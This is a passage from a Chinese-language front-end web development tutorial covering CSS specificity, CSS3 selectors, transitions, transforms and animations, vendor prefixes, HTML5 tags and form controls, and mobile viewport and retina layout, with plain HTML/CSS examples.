id="5-前端页面开发流程"><a href="#5-前端页面开发流程" class="headerlink" title="5. 前端页面开发流程"></a>5. 前端页面开发流程</h1><p>1、创建页面项目目录</p><p>2、使用Photoshop对效果图切图，切出网页制作中需要的小图片</p><p>3、将装饰类图像合并，制作成雪碧图</p><p>4、结合Photoshop和代码编辑器，参照效果图，进行html和css代码书写，制作页面</p><h1 id="6-HTML5和CSS3"><a href="#6-HTML5和CSS3" class="headerlink" title="6. HTML5和CSS3"></a>6. HTML5和CSS3</h1><h2 id="6-1-CSS权重"><a href="#6-1-CSS权重" class="headerlink" title="6.1 CSS权重"></a>6.1 CSS权重</h2><p>CSS权重指的是样式的优先级，有两条或多条样式作用于一个元素，权重高的那条样式对元素起作用,权重相同的，后写的样式会覆盖前面写的样式。</p><h3 id="6-1-1-权重的等级"><a href="#6-1-1-权重的等级" class="headerlink" title="6.1.1 权重的等级"></a>6.1.1 权重的等级</h3><p>可以把样式的应用方式分为几个等级，按照等级来计算权重</p><p>1、!important，加在样式属性值后，权重值为 10000<br>2、内联样式，如：style=””，权重值为1000<br>3、ID选择器，如：#content，权重值为100<br>4、类，伪类和属性选择器，如： content、:hover 权重值为10<br>5、标签选择器和伪元素选择器，如：div、p、:before 权重值为1<br>6、通用选择器（*）、子选择器（&gt;）、相邻选择器（+）、同胞选择器（~）、权重值为0</p><h3 id="6-1-2-权重的计算实例"><a href="#6-1-2-权重的计算实例" class="headerlink" title="6.1.2 权重的计算实例"></a>6.1.2 权重的计算实例</h3><p>1、实例一：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">div</span>&#123;</span><br><span class="line">        <span class="attribute">color</span>:red <span class="meta">!important</span>;</span><br><span class="line">    &#125;        </span><br><span class="line">&lt;/style&gt;</span><br><span class="line">......</span><br><span class="line">&lt;div style="color:blue"&gt;这是一个div元素&lt;/div&gt;</span><br><span class="line">&lt;!<span class="selector-tag">--</span> </span><br><span class="line">两条样式同时作用一个<span class="selector-tag">div</span>，上面的样式权重值为10000+1，下面的行间样式的权重值为1000，</span><br><span class="line">所以文字的最终颜色为<span class="selector-tag">red</span> </span><br><span class="line"><span class="selector-tag">--</span>&gt;</span><br></pre></td></tr></table></figure><p>2、实例二：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-id">#content</span> <span class="selector-tag">div</span><span class="selector-class">.main_content</span> <span class="selector-tag">h2</span>&#123;</span><br><span class="line">        <span class="attribute">color</span>:red;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#content</span> <span class="selector-class">.main_content</span> <span class="selector-tag">h2</span>&#123;</span><br><span class="line">        <span class="attribute">color</span>:blue;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">......</span><br><span class="line">&lt;div id="content"&gt;</span><br><span class="line">    &lt;div class="main_content"&gt;</span><br><span class="line">        &lt;h2&gt;这是一个h2标题&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!<span class="selector-tag">--</span> </span><br><span class="line">第一条样式的权重计算： 100+1+10+1，结果为112；</span><br><span class="line">第二条样式的权重计算： 100+10+1，结果为111；</span><br><span class="line"><span class="selector-tag">h2</span>标题的最终颜色为<span class="selector-tag">red</span></span><br><span class="line"><span class="selector-tag">--</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="6-2-CSS3新增选择器"><a href="#6-2-CSS3新增选择器" class="headerlink" title="6.2 CSS3新增选择器"></a>6.2 CSS3新增选择器</h2><p>1、E:nth-child(n)：匹配元素类型为E且是父元素的第n个子元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;            </span><br><span class="line">    <span class="selector-class">.list</span> <span class="selector-tag">div</span><span class="selector-pseudo">:nth-child(2)</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>:red;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">......</span><br><span class="line">&lt;div class="list"&gt;</span><br><span class="line">    &lt;h2&gt;1&lt;/h2&gt;</span><br><span class="line">    &lt;div&gt;2&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;3&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;4&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;5&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!<span class="selector-tag">--</span> 第2个子元素<span class="selector-tag">div</span>匹配 <span class="selector-tag">--</span>&gt;</span><br></pre></td></tr></table></figure><p>2、E:first-child：匹配元素类型为E且是父元素的第一个子元素<br>3、E:last-child：匹配元素类型为E且是父元素的最后一个子元素<br>4、E &gt; F E元素下面第一层子集<br>5、E ~ F E元素后面的兄弟元素<br>6、E + F 紧挨着的后面的兄弟元素</p><p>属性选择器：<br>1、E[attr] 含有attr属性的元素</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-attr">[data-attr='ok']</span>&#123;</span><br><span class="line">        <span class="attribute">color</span>:red;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">......</span><br><span class="line">&lt;div data-attr="ok"&gt;这是一个div元素&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>2、E[attr=’ok’] 含有attr属性的元素且它的值为“ok”<br>3、E[attr^=’ok’] 含有attr属性的元素且它的值的开头含有“ok”<br>4、E[attr$=’ok’] 含有attr属性的元素且它的值的结尾含有“ok”<br>5、E[attr*=’ok’] 含有attr属性的元素且它的值中含有“ok”</p><h2 id="6-3-CSS3圆角、rgba"><a href="#6-3-CSS3圆角、rgba" class="headerlink" title="6.3 CSS3圆角、rgba"></a>6.3 CSS3圆角、rgba</h2><h3 id="6-3-1-CSS3圆角"><a href="#6-3-1-CSS3圆角" class="headerlink" title="6.3.1 CSS3圆角"></a>6.3.1 CSS3圆角</h3><p>设置某一个角的圆角，比如设置左上角的圆角：<br>border-top-left-radius:30px 60px;</p><p>同时分别设置四个角： border-radius:30px 60px 120px 150px;</p><p>设置四个圆角相同：<br>border-radius:50%;</p><h3 id="6-3-2-rgba（新的颜色值表示法）"><a href="#6-3-2-rgba（新的颜色值表示法）" class="headerlink" title="6.3.2 rgba（新的颜色值表示法）"></a>6.3.2 rgba（新的颜色值表示法）</h3><p>1、盒子透明度表示法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>:<span class="number">0.1</span>;</span><br><span class="line">    <span class="comment">/* 兼容IE */</span></span><br><span class="line">    <span class="attribute">filter</span>:<span class="built_in">alpha</span>(opacity=10); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、rgba(0,0,0,0.1) 前三个数值表示颜色，第四个数值表示颜色的透明度</p><h2 id="6-4-CSS3-transition动画"><a href="#6-4-CSS3-transition动画" class="headerlink" title="6.4 CSS3 transition动画"></a>6.4 CSS3 transition动画</h2><p>1、transition-property 设置过渡的属性，比如：width height background-color<br>2、transition-duration 设置过渡的时间，比如：1s 500ms<br>3、transition-timing-function 设置过渡的运动方式，常用有 linear(匀速)|ease(缓冲运动)<br>4、transition-delay 设置动画的延迟<br>5、transition: property duration timing-function delay 同时设置四个属性</p><h3 id="综合练习："><a href="#综合练习：" class="headerlink" title="综合练习："></a>综合练习：</h3><p>制作鼠标移入图片时，图片说明滑入的效果</p><p><img src="/qianduan_images/034.png" alt="示例图片"></p><h2 id="6-5-CSS3-transform变换"><a href="#6-5-CSS3-transform变换" class="headerlink" title="6.5 CSS3 transform变换"></a>6.5 CSS3 transform变换</h2><p>1、translate(x,y) 设置盒子位移<br>2、scale(x,y) 设置盒子缩放<br>3、rotate(deg) 设置盒子旋转<br>4、skew(x-angle,y-angle) 设置盒子斜切<br>5、perspective 设置透视距离<br>6、transform-style flat | preserve-3d 设置盒子是否按3d空间显示<br>7、translateX、translateY、translateZ 设置三维移动<br>8、rotateX、rotateY、rotateZ 设置三维旋转<br>9、scaleX、scaleY、scaleZ 设置三维缩放<br>10、tranform-origin 设置变形的中心点<br>11、backface-visibility 设置盒子背面是否可见</p><p>举例：（翻面效果）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">DOCTYPE</span> <span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">    &lt;meta charset="UTF-8"&gt;</span><br><span class="line">    &lt;title&gt;翻面&lt;/title&gt;</span><br><span class="line">    &lt;style type="text/css"&gt;</span><br><span class="line">        <span class="selector-class">.box</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">272px</span>;</span><br><span class="line">            <span class="attribute">margin</span>:<span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">transform-style</span>:preserve-<span class="number">3</span>d;</span><br><span class="line">            <span class="attribute">position</span>:relative;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.box</span> <span class="selector-class">.pic</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">272px</span>;</span><br><span class="line">            <span class="attribute">position</span>:absolute;</span><br><span class="line">            <span class="attribute">background-color</span>:cyan;</span><br><span class="line">            <span class="attribute">left</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="attribute">top</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="attribute">transform</span>:<span class="built_in">perspective</span>(800px) <span class="built_in">rotateY</span>(0deg);</span><br><span class="line">            <span class="attribute">backface-visibility</span>:hidden;</span><br><span class="line">            <span class="attribute">transition</span>:all <span class="number">500ms</span> ease;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.box</span> <span class="selector-class">.back_info</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">272px</span>;</span><br><span class="line">            <span class="attribute">text-align</span>:center;</span><br><span class="line">            <span class="attribute">line-height</span>:<span class="number">272px</span>;</span><br><span class="line">            <span class="attribute">background-color</span>:gold;</span><br><span class="line">            <span class="attribute">position</span>:absolute;</span><br><span class="line">            <span class="attribute">left</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="attribute">top</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="attribute">transform</span>:<span class="built_in">rotateY</span>(180deg);</span><br><span class="line">            <span class="attribute">backface-visibility</span>:hidden;</span><br><span class="line">            <span class="attribute">transition</span>:all <span class="number">500ms</span> ease;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.box</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.pic</span>&#123;</span><br><span class="line">            <span class="attribute">transform</span>:<span class="built_in">perspective</span>(800px) <span class="built_in">rotateY</span>(180deg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.box</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.back_info</span>&#123;</span><br><span class="line">            <span class="attribute">transform</span>:<span class="built_in">perspective</span>(800px) <span class="built_in">rotateY</span>(0deg);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">    &lt;div class="box"&gt;        </span><br><span class="line">        &lt;div class="pic"&gt;&lt;img src="images/location_bg.jpg"&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class="back_info"&gt;背面文字说明&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="6-6-CSS3-animation动画"><a href="#6-6-CSS3-animation动画" class="headerlink" title="6.6 CSS3 animation动画"></a>6.6 CSS3 animation动画</h2><p>1、@keyframes 定义关键帧动画<br>2、animation-name 动画名称<br>3、animation-duration 动画时间<br>4、animation-timing-function 动画曲线 linear(匀速)|ease(缓冲)|steps(步数)<br>5、animation-delay 动画延迟<br>6、animation-iteration-count 动画播放次数 n|infinite<br>7、animation-direction 动画结束后是否反向还原 normal|alternate<br>8、animation-play-state 动画状态 paused(停止)|running(运动)<br>9、animation-fill-mode 动画前后的状态 none(缺省)|forwards(结束时停留在最后一帧)|backwards(开始时停留在定义的开始帧)|both(前后都应用)<br>10、animation:name duration timing-function delay iteration-count direction;同时设置多个属性</p><p>理解练习：<br>1、风车动画<br>2、loading动画<br><img src="/qianduan_images/035.png" alt="示例图片"></p><p>3、人物走路动画</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">DOCTYPE</span> <span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">    &lt;meta charset="UTF-8"&gt;</span><br><span class="line">    &lt;title&gt;走路动画&lt;/title&gt;</span><br><span class="line">    &lt;style type="text/css"&gt;        </span><br><span class="line">        <span class="selector-class">.box</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>:<span class="number">120px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">180px</span>;</span><br><span class="line">            <span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;            </span><br><span class="line">            <span class="attribute">margin</span>:<span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">position</span>:relative;</span><br><span class="line">            <span class="attribute">overflow</span>:hidden;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="selector-class">.box</span> <span class="selector-tag">img</span>&#123;</span><br><span class="line">            <span class="attribute">display</span>:block;</span><br><span class="line">            <span class="attribute">width</span>:<span class="number">960px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">182px</span>;</span><br><span class="line">            <span class="attribute">position</span>: absolute;</span><br><span class="line">            <span class="attribute">left</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="attribute">top</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="attribute">animation</span>:walking <span class="number">1.0s</span> <span class="built_in">steps</span>(8) infinite;            </span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="keyword">keyframes</span> walking&#123;</span><br><span class="line">            <span class="selector-tag">from</span>&#123;</span><br><span class="line">                <span class="attribute">left</span>:<span class="number">0px</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="selector-tag">to</span>&#123;</span><br><span class="line">                <span class="attribute">left</span>:-<span class="number">960px</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">    &lt;div class="box"&gt;&lt;img src="images/walking.png"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>动画中使用的图片如下：</p><p><img src="/qianduan_images/036.png" alt="示例图片"></p><h2 id="6-7-CSS3-浏览器前缀"><a href="#6-7-CSS3-浏览器前缀" class="headerlink" title="6.7 CSS3 浏览器前缀"></a>6.7 CSS3 浏览器前缀</h2><h3 id="6-7-1-浏览器样式前缀"><a href="#6-7-1-浏览器样式前缀" class="headerlink" title="6.7.1 浏览器样式前缀"></a>6.7.1 浏览器样式前缀</h3><p>为了让CSS3样式兼容，需要将某些样式加上浏览器前缀：</p><p>-ms- 兼容IE浏览器<br>-moz- 兼容firefox<br>-o- 兼容opera<br>-webkit- 兼容chrome 和 safari</p><p>比如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="attribute">-ms-transform</span>: <span class="built_in">rotate</span>(30deg);        </span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotate</span>(30deg);    </span><br><span class="line">    <span class="attribute">-o-transform</span>: <span class="built_in">rotate</span>(30deg);        </span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">rotate</span>(30deg);    </span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(30deg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-7-2-自动添加浏览器前缀"><a href="#6-7-2-自动添加浏览器前缀" class="headerlink" title="6.7.2 自动添加浏览器前缀"></a>6.7.2 自动添加浏览器前缀</h3><p>目前的状况是，有些CSS3属性需要加前缀，有些不需要加，有些只需要加一部分，这些加前缀的工作可以交给插件来完成，比如安装： autoprefixer</p><p>可以在Sublime text中通过package control 安装 autoprefixer</p><h3 id="6-7-3-Autoprefixer在Sublime-text中的设置："><a href="#6-7-3-Autoprefixer在Sublime-text中的设置：" class="headerlink" title="6.7.3 Autoprefixer在Sublime text中的设置："></a>6.7.3 Autoprefixer在Sublime text中的设置：</h3><p>1、preferences/key Bindings-User</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; "keys": ["ctrl+alt+x"], "command": "autoprefixer" &#125;</span><br></pre></td></tr></table></figure><p>2、Preferences&gt;package setting&gt;AutoPrefixer&gt;Setting-User</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "browsers": ["last 7 versions"],</span><br><span class="line">    "<span class="selector-tag">cascade</span>": <span class="selector-tag">true</span>,</span><br><span class="line">    "<span class="selector-tag">remove</span>": <span class="selector-tag">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>last 7 versions：最新的浏览器的7个版本<br>cascade：缩进美化属性值<br>remove：是否去掉不必要的前缀</p><h2 id="6-8-HTML5新增标签"><a href="#6-8-HTML5新增标签" class="headerlink" title="6.8 HTML5新增标签"></a>6.8 HTML5新增标签</h2><h3 id="6-8-1-新增语义标签"><a href="#6-8-1-新增语义标签" class="headerlink" title="6.8.1 新增语义标签"></a>6.8.1 <strong>新增语义标签</strong></h3><p>1、<code>&lt;header&gt;</code> 页面头部、页眉<br>2、<code>&lt;nav&gt;</code> 页面导航<br>3、<code>&lt;article&gt;</code> 一篇文章<br>4、<code>&lt;section&gt;</code> 文章中的章节<br>5、<code>&lt;aside&gt;</code> 侧边栏<br>6、<code>&lt;footer&gt;</code> 页面底部、页脚</p><h3 id="6-8-2-音频视频"><a href="#6-8-2-音频视频" class="headerlink" title="6.8.2 音频视频"></a>6.8.2 <strong>音频视频</strong></h3><p>1、<code>&lt;audio&gt;</code><br>2、<code>&lt;video&gt;</code></p><p>PC端兼容h5的新标签的方法，在页面中引入以下js文件:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type="text/javascript" src="//cdn.bootcss.com/html5shiv/r29/html5.js"&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-9-HTML5-新增表单控件"><a href="#6-9-HTML5-新增表单控件" class="headerlink" title="6.9 HTML5 新增表单控件"></a>6.9 HTML5 新增表单控件</h2><p>新增类型：网址 邮箱 日期 时间 星期 数量 范围 电话 颜色 搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;label&gt;网址:&lt;/label&gt;&lt;input type=&quot;url&quot; name=&quot;&quot; required&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;邮箱:&lt;/label&gt;&lt;input type=&quot;email&quot; name=&quot;&quot; required&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;日期:&lt;/label&gt;&lt;input type=&quot;date&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;时间:&lt;/label&gt;&lt;input type=&quot;time&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;星期:&lt;/label&gt;&lt;input type=&quot;week&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;数量:&lt;/label&gt;&lt;input type=&quot;number&quot; name=&quot;&quot;&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;label&gt;范围:&lt;/label&gt;&lt;input type=&quot;range&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;电话:&lt;/label&gt;&lt;input type=&quot;tel&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;颜色:&lt;/label&gt;&lt;input type=&quot;color&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;label&gt;搜索:&lt;/label&gt;&lt;input type=&quot;search&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure><p>新增常用表单控件属性：<br>1、placeholder 设置文本框默认提示文字<br>2、autofocus 自动获得焦点<br>3、autocomplete 联想关键词</p><h1 id="7-移动端页面开发"><a href="#7-移动端页面开发" class="headerlink" title="7. 移动端页面开发"></a>7. 移动端页面开发</h1><h2 id="7-1-移动端与PC端页面布局区别"><a href="#7-1-移动端与PC端页面布局区别" class="headerlink" title="7.1 移动端与PC端页面布局区别"></a>7.1 移动端与PC端页面布局区别</h2><h3 id="7-1-1-视口"><a href="#7-1-1-视口" class="headerlink" title="7.1.1 视口"></a>7.1.1 视口</h3><p>视口是移动设备上用来显示网页的区域，一般会比移动设备可视区域大，宽度可能是980px或者1024px，目的是为了显示下整个为PC端设计的网页，这样带来的后果是移动端会出现横向滚动条，为了避免这种情况，移动端会将视口缩放到移动端窗口的大小。这样会让网页不容易观看，可以用 meta 标签，name=“viewport ” 来设置视口的大小，将视口的大小设置为和移动设备可视区一样的大小。</p><p>设置方法如下( 快捷方式：meta:vp + tab )：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">......</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no,</span><br><span class="line"> initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class="line">......</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p>pc端与移动端渲染网页过程：<br><img src="/qianduan_images/034.jpg" alt="示例图片"></p><h3 id="7-1-2-视网膜屏幕（retina屏幕）清晰度解决方案"><a href="#7-1-2-视网膜屏幕（retina屏幕）清晰度解决方案" class="headerlink" title="7.1.2 视网膜屏幕（retina屏幕）清晰度解决方案"></a>7.1.2 视网膜屏幕（retina屏幕）清晰度解决方案</h3><p>视网膜屏幕指的是屏幕的物理像素密度更高的屏幕，物理像素可以理解为屏幕上的一个发光点，无数发光的点组成的屏幕，视网膜屏幕比一般屏幕的物理像素点更小，常见有2倍的视网膜屏幕和3倍的视网膜屏幕，2倍的视网膜屏幕，它的物理像素点大小是一般屏幕的1/4,3倍的视网膜屏幕，它的物理像素点大小是一般屏幕的1/9。</p><p>图像在视网膜屏幕上显示的大小和在一般屏幕上显示的大小一样，但是由于视网膜屏幕的物理像素点比一般的屏幕小，图像在上面好像是被放大了，图像会变得模糊，为了解决这个问题，可以使用比原来大一倍的图像，然后用css样式强制把图像的尺寸设为原来图像尺寸的大小，就可以解决模糊的问题。</p><p>清晰度解决过程示意图：<br><img src="/qianduan_images/035.jpg" alt="示例图片"></p><p>背景图强制改变大小，可以使用background新属性</p><p><strong>background新属性</strong><br>background-size:</p><ul><li>length：用长度值指定背景图像大小。不允许负值。</li><li>percentage：用百分比指定背景图像大小。不允许负值。</li><li>auto：背景图像的真实大小。</li><li>cover：将背景图像等比缩放到完全覆盖容器，背景图像有可能超出容器。</li><li>contain：将背景图像等比缩放到宽度或高度与容器的宽度或高度相等，背景图像始终被包含在容器内。</li></ul><h2 id="7-2-适配布局类型"><a href="#7-2-适配布局类型" class="headerlink" title="7.2 适配布局类型"></a>7.2 适配布局类型</h2><h3 id="7-2-1-PC及移动端页面适配方法"><a href="#7-2-1-PC及移动端页面适配方法" class="headerlink" title="7.2.1 PC及移动端页面适配方法"></a>7.2.1 PC及移动端页面适配方法</h3><p>设备屏幕有多种不同的分辨率，页面适配方案有如下几种：</p><p>1、全适配：响应式布局+流体布局<br>2、移动端适配：</p><ul><li>流体布局+少量响应式</li><li>基于rem的布局</li></ul><h3 id="7-2-2-流体布局"><a href="#7-2-2-流体布局" class="headerlink" title="7.2.2 流体布局"></a>7.2.2 流体布局</h3><p>流体布局，就是使用百分比来设置元素的宽度，元素的高度按实际高度写固定值，流体布局中，元素的边线无法用百分比，可以使用样式中的计算函数 calc() 来设置宽度，或者使用 box-sizing 属性将盒子设置为从边线计算盒子尺寸。</p><p><strong>calc()</strong><br>可以通过计算的方式给元素加尺寸，比如： width：calc(25% - 4px);</p><p><strong>box-sizing</strong><br>1、content-box 默认的盒子尺寸计算方式<br>2、border-box 置盒子的尺寸计算方式为从边框开始，盒子的尺寸，边框和内填充算在盒子尺寸内</p><h3 id="7-2-3-响应式布局"><a href="#7-2-3-响应式布局" 